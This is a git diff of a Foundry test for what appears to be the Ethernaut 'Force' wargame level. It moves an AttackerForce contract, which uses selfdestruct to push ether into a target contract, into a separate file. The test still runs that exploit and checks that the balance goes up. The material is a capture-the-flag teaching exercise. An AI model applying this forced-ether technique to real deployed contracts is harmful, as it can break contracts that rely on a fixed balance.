@@ -3,12 +3,7 @@ pragma solidity ^0.6.0;
 
 import "forge-std/Test.sol";
 import "instances/07_force.sol";
-
-contract AttackerForce {
-    function exploit(address force) public payable {
-        selfdestruct(payable(force));
-    }
-}
+import "contracts/07_force.sol";
 
 contract AttackerForceTest is Test {
     function testForce() external {
@@ -17,12 +12,12 @@ contract AttackerForceTest is Test {
         AttackerForce attackerForce = new AttackerForce();
 
         console.log("Initial balance ", address(force).balance);
-        assertEq(address(force).balance , 0);
+        assertEq(address(force).balance, 0);
 
         attackerForce.exploit{value: 1 wei}(address(force));
 
         console.log("Final balance ", address(force).balance);
-        assertGt(address(force).balance , 0);
+        assertGt(address(force).balance, 0);
     }
 
     receive() external payable {}
